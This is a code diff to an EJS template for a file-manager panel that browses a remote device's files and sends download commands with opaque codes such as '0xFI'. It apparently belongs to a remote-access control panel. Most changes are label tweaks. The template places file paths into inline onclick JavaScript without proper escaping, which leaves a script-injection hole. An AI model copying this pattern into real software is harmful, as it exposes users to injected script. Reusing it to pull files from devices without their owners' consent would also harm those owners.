@@ -1,7 +1,7 @@
 <div class="card">
     <div class="card-header">
         <h2>File Manager</h2>
-        <button class="btn" onclick="browseFiles('')">Go to Root</button>
+        <button class="btn primary" onclick="browseFiles('')">Root</button>
     </div>
     
     <% if (data.path) { %>
@@ -9,13 +9,14 @@
     <% } %>
     
     <% if (!data.list || data.list.length === 0) { %>
-    <p class="empty">Click "Go to Root" to browse files.</p>
+    <p class="empty">Click "Root" to browse device files.</p>
     <% } else { %>
     <div class="file-list">
         <% data.list.forEach(f => { %>
         <div class="file-item" onclick="<%= f.isDir ? `browseFiles('${f.path}')` : `downloadFile('${f.path}')` %>">
             <span class="file-icon"><%= f.isDir ? '📁' : '📄' %></span>
             <span class="file-name"><%= f.name %></span>
+            <% if (!f.isDir) { %><span class="file-action">Download</span><% } %>
         </div>
         <% }) %>
     </div>
@@ -29,8 +30,8 @@ function browseFiles(path) {
 
 function downloadFile(path) {
     if (confirm('Download this file?')) {
-        sendCmd('0xFI', {action: 'dl', path});
-        toast('Download requested...', 'info');
+        sendCmdNoReload('0xFI', {action: 'dl', path: path});
+        toast('Download started... Check Downloads page.', 'info');
     }
 }
 </script>
